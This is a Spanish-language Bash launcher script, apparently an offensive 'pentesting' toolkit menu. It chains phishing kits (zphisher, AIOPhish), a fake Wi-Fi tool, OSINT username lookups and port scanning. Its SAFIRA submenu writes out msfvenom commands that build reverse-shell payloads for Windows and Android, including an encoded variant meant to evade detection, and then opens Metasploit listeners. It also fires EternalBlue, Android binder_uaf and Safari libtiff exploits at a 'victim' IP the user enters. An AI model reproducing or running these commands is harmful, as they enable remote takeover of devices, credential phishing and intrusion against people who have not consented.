#!/bin/bash
#Dejo claro que en mi codigo de esta herramienta hay codigos de hackers y programadores externos 
#como Tito S4bitar con la herramienta EVILTRUST
# y las demas herramientas desconosco los nombres de los desarrolladores pero como dije en lo anterior 
#les dejo claro para que tengan los creditos 

#Desarrollador de esta Herramienta cripton666 (jaime manquel)

#herramienta diseñada para el pentesting Etico
#se puede copiar el codigo pero dejar Creditos :)

function hellpanel {
	echo -e "\e[1;35mEl panel de ayuda se creo para informar al usuario de las herramienta 
	      que fueron ocupadas para la investigacion\e[0m"
}
function limpieza_pantalla {
	clear 
}
function lynis {
	echo -e "\e[1;33mLynis es una herramienta de auditoria de seguridad de código abierto. Su principal objetivo es auditar y «endurecer» sistemas basados en Linux e Unix. Escanea el sistema realizando varios chequeos de controles de seguridad.\e[0m"
}
trap ctrl_c INT 
function ctrl_c() {
    echo -e "\n\n\e[1;31m[*]SALIENDO DEL SCRIPT\e[0m\n"
    exit 0
}

limpieza_pantalla
echo
echo
echo
echo -e "\e[1;31m                         ██████╗ ███████╗██╗      █████╗ ███████╗██╗  ██╗\e[0m"
echo -e "\e[1;31m                         ██╔══██╗██╔════╝██║     ██╔══██╗██╔════╝██║  ██║\e[0m"
echo -e "\e[1;31m                         ██████╔╝█████╗  ██║     ███████║███████╗███████║\e[0m"
echo -e "\e[1;31m                         ██╔═══╝ ██╔══╝  ██║     ██╔══██║╚════██║██╔══██║\e[0m"
echo -e "\e[1;31m                         ██║██╗  ██║     ███████╗██║  ██║███████║██║  ██║\e[0m"
echo -e "\e[1;31m                         ╚═╝╚═╝  ╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝\e[0m"
                                                
echo
echo
sleep 1s 
echo -e "\e[96mDERECHOS RESERVADOS DE AUTOR :\e[0m \e[1;31mCripton666\e[0m"
sleep 1s
echo -e "\e[96mPAGINA WEB :\e[0m \e[1;31mhttps://cripton6661989.wixsite.com/hack\e[0m"
sleep 1s
echo -e "\e[96mGITHUB :\e[0m \e[1;31mhttps://github.com/cripton666\e[0m"
echo
echo
sleep 2s
while :
do 
opcion=0
echo -e "\e[1;33m  [1]\e[0m \e[1;34mESCANEO PERSONAL\e[0m"                 
echo -e "\e[1;33m  [2]\e[0m \e[1;34mBUSQUEDA DE EXPLOIT\e[0m"
echo -e "\e[1;33m  [3]\e[0m \e[1;34mANALISIS DE DOMINIOS WEB\e[0m"
echo -e "\e[1;33m  [4]\e[0m \e[1;34mZPHISHER\e[0m"
echo -e "\e[1;33m  [5]\e[0m \e[1;34mEVILTRUST(Wifi falso)\e[0m"
echo -e "\e[1;33m  [6]\e[0m \e[1;34mAIOPHISH\e[0m"
echo -e "\e[1;33m  [7]\e[0m \e[1;34mSAFIRA\e[0m"
echo -e "\e[1;33m  [8]\e[0m \e[1;34mESCANEO RAPIDO\e[0m"
echo -e "\e[1;33m  [9]\e[0m \e[1;34mEVIL-DROID\e[0m"
echo -e "\e[1;33m  [10]\e[0m \e[1;34mGHOST\e[0m"
echo -e "\e[1;33m  [11]\e[0m \e[1;34mSHERLOCK\e[0m"
echo -e "\e[1;33m  [12]\e[0m \e[1;34mSALIR\e[0m"
echo
echo -n -e "\e[1;33m  [*]\e[0m \e[1;37mElige una opcion:\e[0m"
read opcion
case $opcion in
1)
limpieza_pantalla
				echo -e "\e[1;31m [*]ESCANEO DE TODO EL SISTEMA LINUX\e[0m"
				sleep 3s
				echo
				echo -e "\e[1;31m [*]ENTREGANDO RESPUESTA\e[0m"
				echo
				sleep 3s
				echo -e "\e[1;31m [*]ESPERE 5 SEGUNDOS\e[0m"
				sleep 5s
				limpieza_pantalla
				sudo lynis audit system
read enterkey
;;
2)
limpieza_pantalla
sleep 1s
read -p "NOMBRE DE SISTEMA O CODIGO DE EXPLOIT :" o
limpieza_pantalla
sleep 2s
echo -e "\e[1;31m[*]BUSCANDO EXPLOIT\e[0"
sleep 2s
echo -e "\e[1;31m[*]CARGANDO EXPLOIT\e[0"
sleep 3-s
limpieza_pantalla
sudo searchsploit -t $o 
read enterkey
;;
3)
limpieza_pantalla
sleep 1s
echo -e "\e[1;31m[*]LOS DOMINIOS WEB GUARDAN INFORMACION VALIOSA PARA EL ATACANTE\e[0m"
sleep 2s
read -p "PAGUINA WEB :" a
limpieza_pantalla
sleep 1s 
echo -e "\e[1;31m[*]ESTO PUEDE TARDAR HASTA 5 MINUTOS\e[0m"
sleep 2s
echo 
echo -e "\e[1;31m[*]EJECUTANDO SCRIPT\e[0m"
sleep 2s
echo
echo -e "\e[1;31m[*]CARGANDO VINCULOS\e[0m"
sleep 2s 
sudo nmap -sS -sV $a
read enterkey
;;
4)
cd Herramientas
cd zphisher
chmod +x zphisher.sh
./zphisher.sh
sleep 5m
read enterkey
;;
5)
cd Herramientas
echo -e "\e[1;31m[*]Herramienta Creada por Tito S4bitar\e[0"
sleep 3s
cd evilTrust
sudo chmod +x evilTrust.sh
sudo ./evilTrust.sh -m terminal
read enterkey
;;
6)
limpieza_pantalla
cd Herramientas
cd AIOPhish 
./aiophish.sh
read enterkey
;;
7)
#este programa es para crear paylaoad automaticos 
#desarrollador del script
#CRIPTON666(JAIME MANQUEL)
trap ctrl_c INT
function ctrl_c() {
    echo -e "\e[0;31m SALIENDO DE SAFIRA\e[0m"
    sleep 2s
    limpiar
    exit 0
}
function limpiar {
    clear
}
limpiar
echo
echo 
sleep 1s
echo -e "\e[1;31m                      ███████╗ █████╗ ███████╗██╗██████╗  █████╗ \e[0m"
echo -e "\e[1;31m                      ██╔════╝██╔══██╗██╔════╝██║██╔══██╗██╔══██╗\e[0m"
echo -e "\e[1;31m                      ███████╗███████║█████╗  ██║██████╔╝███████║\e[0m"
echo -e "\e[1;31m                      ╚════██║██╔══██║██╔══╝  ██║██╔══██╗██╔══██║\e[0m"
echo -e "\e[1;31m                      ███████║██║  ██║██║     ██║██║  ██║██║  ██║\e[0m"
echo -e "\e[1;31m                      ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝\e[0m"
echo
echo
sleep 1s
echo -e "\e[1;34m   CREADOR DEL SCRIPT :\e[0m \e[1;31mCRIPTON666 (jaime manquel)\e[0m"
sleep 1s
echo -e "\e[1;34m   PAGINA WEB :\e[0m \e[1;31mhttps://cripton6661989.wixsite.com/hack\e[0m"
sleep 1s
echo -e "\e[1;34m   GITHUB :\e[0m \e[1;31mhttps://github.com/cripton666\e[0m"
sleep 1s
echo
while :
do 
opcion=0
echo
echo -e "\e[1;33m   [1]\e[0m \e[1;34mwindows/meterpreter/reverse_tcp\e[0m"
echo -e "\e[1;33m   [2]\e[0m \e[1;34mandroid/meterpreter/reverse_tcp\e[0m"
echo -e "\e[1;33m   [3]\e[0m \e[1;34mwindows/shell/reverse_tcp\e[0m"
echo -e "\e[1;33m   [4]\e[0m \e[1;34mexploit/android/local/binder_uaf\e[0m"
echo -e "\e[1;33m   [5]\e[0m \e[1;34mwindows/meterpreter/reverse_tcp(shikata_ga_nai)\e[0m"
echo -e "\e[1;33m   [6]\e[0m \e[1;34mexploit/apple_ios/browser/safari_libtiff\e[0m"
echo -e "\e[1;33m   [7]\e[0m \e[1;34mexploit/windows/smb/ms17_010_eternalblue\e[0m"
echo -e "\e[1;33m   [8]\e[0m \e[1;34mSALIR\e[0m"
echo
echo -n -e "\e[1;37m   Elige una opcion :\e[0m"
read opcion
case $opcion in 
1)
limpiar
echo -e "\e[1;31m[*]PARA CREAR LA APLICACION VAMOS A NECESITAR ALGUNOS DATOS\e[0m"
sleep 3s 
limpiar
echo -n -e "\e[1;33mDIRECCION IP O HOST DINAMICO :\e[0m"
read IP
sleep 2s
echo -n -e "\e[1;33mPUERTO DE CONECCION :\e[0m"
read PUERTO
sleep 2s
echo -n -e "\e[1;33mELIJA UN NOMBRE PARA LA APLICACION :\e[0m"
read NOMBRE
sleep 2s 
limpiar
echo -e "\e[1;31m[*]CREANDO APLICACION\e[0m"
sleep 2s 
echo -e "\e[1;31m[*]EQUIPANDO VÍNCULOS\e[0m"
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$PUERTO -f exe -o $NOMBRE.exe
echo -e "\e[1;31m[*]CREADO CON EXITO\e[0m"
sleep 2s 
limpiar
echo
echo -e "\e[1;31m[*]VAMOS A DEJARTE EN MODO ESCUCHA\e[0m"
echo
sleep 3
limpiar
echo -e "\e[1;31m[*]EJECUTANDO SERVICIO POSTGRESQL\e[0m"
sudo service postgresql start
sleep 2s
echo -e "\e[1;31m[*]CONECTANDO CON EXITO\e[0m"
sleep 2s
echo -e "\e[1;31m[*]ABRIENDO METASPLOIT\e[0m"
echo -e "\e[1;31mESTO PUEDE TARDAR MAXIMO 10 SEGUNDOS\e[0m"
sleep 3s 
limpiar
msfconsole -x "use multi/handler;\
set PAYLOAD windows/meterpreter/reverse_tcp;\
set LHOST $IP;\
set LPORT $PUERTO;\
exploit"
read enterkey
;;
2)
limpiar
echo -e "\e[1;31m[*]PARA CREAR LA APLICACION VAMOS A NECESITAR ALGUNOS DATOS\e[0m"
sleep 3s 
limpiar
echo -n -e "\e[1;33mDIRECCION IP O HOST DINAMICO :\e[0m"
read IP
sleep 2s
echo -n -e "\e[1;33mPUERTO DE CONECCION :\e[0m"
read PUERTO
sleep 2s
echo -n -e "\e[1;33mELIJA UN NOMBRE PARA LA APLICACION :\e[0m"
read NOMBRE
sleep 2s 
limpiar
echo -e "\e[1;31m[*]CREANDO APLICACION\e[0m"
sleep 2s 
echo -e "\e[1;31m[*]EQUIPANDO VÍNCULOS\e[0m"
msfvenom -p android/meterpreter/reverse_tcp LHOST=$IP LPORT=$PUERTO R > $NOMBRE.apk
echo -e "\e[1;31m[*]CREADO CON EXITO\e[0m"
sleep 2s 
limpiar
echo
echo -e "\e[1;31m[*]VAMOS A DEJARTE EN MODO ESCUCHA\e[0m"
echo
sleep 3
limpiar
echo -e "\e[1;31m[*]EJECUTANDO SERVICIO POSTGRESQL\e[0m"
sudo service postgresql start
sleep 3s
echo -e "\e[1;31m[*]CONECTANDO CON EXITO\e[0m"
sleep 3s
echo -e "\e[1;31m[*]ABRIENDO METASPLOIT\e[0m"
echo -e "\e[1;31nESTO PUEDE TARDAR MAXIMO 10 SEGUNDOS"
sleep 3s 
limpiar
msfconsole -x "use multi/handler;\
set PAYLOAD android/meterpreter/reverse_tcp;\
set LHOST $IP;\
set LPORT $PUERTO;\
exploit"
read enterkey
;;
3)
limpiar
echo -e "\e[1;31m[*]PARA CREAR LA APLICACION VAMOS A NECESITAR ALGUNOS DATOS\e[0m"
sleep 3s 
limpiar
echo -n -e "\e[1;33mDIRECCION IP O HOST DINAMICO :\e[0m"
read IP
sleep 2s
echo -n -e "\e[1;33mPUERTO DE CONECCION :\e[0m"
read PUERTO
sleep 2s
echo -n -e "\e[1;33mELIJA UN NOMBRE PARA LA APLICACION :\e[0m"
read NOMBRE
sleep 2s 
limpiar
echo -e "\e[1;31m[*]CREANDO APLICACION\e[0m"
sleep 2s 
echo -e "\e[1;31m[*]EQUIPANDO VÍNCULOS\e[0m"
msfvenom -p windows/shell/reverse_tcp LHOST=$IP LPORT=$PUERTO -f exe -o $NOMBRE.exe
echo -e "\e[1;31m[*]CREADO CON EXITO\e[0m"
sleep 2s 
limpiar
echo
echo -e "\e[1;31m[*]VAMOS A DEJARTE EN MODO ESCUCHA\e[0m"
echo
sleep 3
limpiar
echo -e "\e[1;31m[*]EJECUTANDO SERVICIO POSTGRESQL\e[0m"
sudo service postgresql start
sleep 3s
echo -e "\e[1;31m[*]CONECTANDO CON EXITO\e[0m"
sleep 3s
echo -e "\e[1;31m[*]ABRIENDO METASPLOIT\e[0m"
echo -e "\e[1;31nESTO PUEDE TARDAR MAXIMO 10 SEGUNDOS"
sleep 3s 
limpiar
msfconsole -x "use multi/handler;\
set PAYLOAD windows/shell/reverse_tcp;\
set LHOST $IP;\
set LPORT $PUERTO;\
exploit"
read enterkey
;;
4)
limpiar
echo -e "\e[1;31m[*]CONFIGURANDO EL EXPLOIT\e[0m"
sleep 3s 
limpiar
echo -n -e "\e[1;33mDIRECCION IP O HOST DINAMICO :\e[0m"
read IP
sleep 2s
echo -n -e "\e[1;33mNUMERO DE SESSION :\e[0m"
read NUMERO
sleep 2s 
limpiar
echo
echo -e "\e[1;31m[*]EQUIPANDO VÍNCULOS\e[0m"
sleep 2s 
echo
echo -e "\e[1;31m[*]CONECTANDO CON EXPLOIT\e[0m"
echo
sleep 3
echo -e "\e[1;31m[*]EJECUTANDO SERVICIO POSTGRESQL\e[0m"
sudo service postgresql start
sleep 3s
echo -e "\e[1;31m[*]CONECTANDO CON EXITO\e[0m"
sleep 3s
echo -e "\e[1;31m[*]ABRIENDO METASPLOIT\e[0m"
echo -e "\e[1;31nESTO PUEDE TARDAR MAXIMO 10 SEGUNDOS"
sleep 3s 
limpiar
msfconsole -x "use exploit/android/local/binder_uaf;\
                set SESSION $NUMERO;\
                set LHOST $IP;\
                run" 
read enterkey
;;
5)
limpiar
echo -e "\e[1;31m[*]PARA CREAR LA APLICACION VAMOS A NECESITAR ALGUNOS DATOS\e[0m"
sleep 3s 
limpiar
echo -n -e "\e[1;33mDIRECCION IP O HOST DINAMICO :\e[0m"
read IP
sleep 2s
echo -n -e "\e[1;33mPUERTO DE CONECCION :\e[0m"
read PUERTO
sleep 2s
echo -n -e "\e[1;33mELIJA UN NOMBRE PARA LA APLICACION :\e[0m"
read NOMBRE
sleep 2s 
limpiar
echo -e "\e[1;31m[*]CREANDO APLICACION\e[0m"
sleep 2s 
echo
echo -e "\e[1;31m[*]TENDRA 30 CAPAS DEL ENCODER SHICATA_GA_NAI\e[0m"
sleep 2s 
echo
echo -e "\e[1;31m[*]EQUIPANDO VÍNCULOS\e[0m"
sleep 2s 
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$PUERTO -e x86/shikata_ga_nai -i 30 -f exe > $NOMBRE.exe
echo -e "\e[1;31m[*]CREADO CON EXITO\e[0m"
sleep 2s 
limpiar
echo
echo -e "\e[1;31m[*]VAMOS A DEJARTE EN MODO ESCUCHA\e[0m"
echo
sleep 3
limpiar
echo -e "\e[1;31m[*]EJECUTANDO SERVICIO POSTGRESQL\e[0m"
sudo service postgresql start
sleep 3s
echo -e "\e[1;31m[*]CONECTANDO CON EXITO\e[0m"
sleep 3s
echo -e "\e[1;31m[*]ABRIENDO METASPLOIT\e[0m"
echo -e "\e[1;31nESTO PUEDE TARDAR MAXIMO 10 SEGUNDOS"
sleep 3s 
limpiar
msfconsole -x "use multi/handler;\
set PAYLOAD windows/meterpreter/reverse_tcp;\
set LHOST $IP;\
set LPORT $PUERTO;\
exploit"
read enterkey
;;
6)
limpiar
echo -e "\e[1;31m[*]CONFIGURANDO EL EXPLOIT\e[0m"
sleep 3s 
limpiar
echo -n -e "\e[1;33mDIRECCION IP DE LA VICTIMA :\e[0m"
read IP
limpiar
echo
echo -e "\e[1;31m[*]EQUIPANDO VÍNCULOS\e[0m"
sleep 2s 
echo
echo -e "\e[1;31m[*]CONECTANDO CON EXPLOIT\e[0m"
echo
sleep 3
echo -e "\e[1;31m[*]EJECUTANDO SERVICIO POSTGRESQL\e[0m"
sudo service postgresql start
sleep 3s
echo -e "\e[1;31m[*]CONECTANDO CON EXITO\e[0m"
sleep 3s
echo -e "\e[1;31m[*]ABRIENDO METASPLOIT\e[0m"
echo -e "\e[1;31nESTO PUEDE TARDAR MAXIMO 10 SEGUNDOS"
sleep 3s 
limpiar
msfconsole -x "use exploit/apple_ios/browser/safari_libtiff;\
                set URIPATH;\
                set VRHOST $IP;\
                set VRSPORT 8080;\
                run" 
read enterkey
;;
7)
limpiar
echo -e "\e[1;31m[*]CONFIGURANDO EL EXPLOIT\e[0m"
sleep 3s 
limpiar
echo -n -e "\e[1;33mDIRECCION IP DE LA VICTIMA :\e[0m"
read IP
limpiar
echo
echo -e "\e[1;31m[*]EQUIPANDO VINCULOS\e[0m"
sleep 2s 
echo
echo -e "\e[1;31m[*]CONECTANDO CON EXPLOIT\e[0m"
echo
sleep 3
echo -e "\e[1;31m[*]EJECUTANDO SERVICIO POSTGRESQL\e[0m"
sudo service postgresql start
sleep 3s
echo -e "\e[1;31m[*]CONECTANDO CON EXITO\e[0m"
sleep 3s
echo -e "\e[1;31m[*]ABRIENDO METASPLOIT\e[0m"
echo -e "\e[1;31n[*]ESTO PUEDE TARDAR MAXIMO 10 SEGUNDOS"
sleep 3s 
limpiar
msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue;\
                set RHOSTS $IP;\
                set RPORT 445;\
                set VERIFY_ARCH;\
                set VERIFY_TARGET;\
                exploit"
read enterkey
;;
8)
limpiar
exit 0
read enterkey
;;
*)
clear
echo -e "\e[1;37mLa opcion\e[0m \e[1;33m[$opcion]\e[0m \e[1;37mno esta en la lista\e[0m \e[1;31m:(\e[0m"
read enterkey
;;
esac
done
read enterkey 
;;
8)
limpieza_pantalla
trap ctrl_c INT 
function ctrl_c(){
    echo -e "\n\n\e[1;31m[*]SALIENDO DEL SCRIPT\e[0m\n"
    exit 0
}
echo -n -e "\e[1;33mAQUI IP :\e[0m"
read IP
for port in $(seq 1 65530); do
    tomeout 1 bash -c "echo '' < /dev/tcp/$IP/$port" 2>/dev/null && echo "Port $port - OPEN" &
done; wait     
;;
9)
sleep 1s
limpieza_pantalla
cd Herramientas
cd Evil-Droid
./evil-droid
read enterkey
;;
10)
limpieza_pantalla
cd Herramientas
cd ghost
ghost
;;
11)
limpieza_pantalla
cd Herramientas
cd sherlock 
cd sherlock 
echo -n -e "\e[1;33mIngrese nombre del perfil :\e[0m"
read nombre 
python3 sherlock.py $nombre 
;;
12)
;;
*)
clear
echo -e "\e[1;37mLa opcion\e[0m \e[1;33m[$opcion]\e[0m \e[1;37mno esta en la lista\e[0m \e[1;31m:(\e[0m"
read enterkey
;;
esac
done
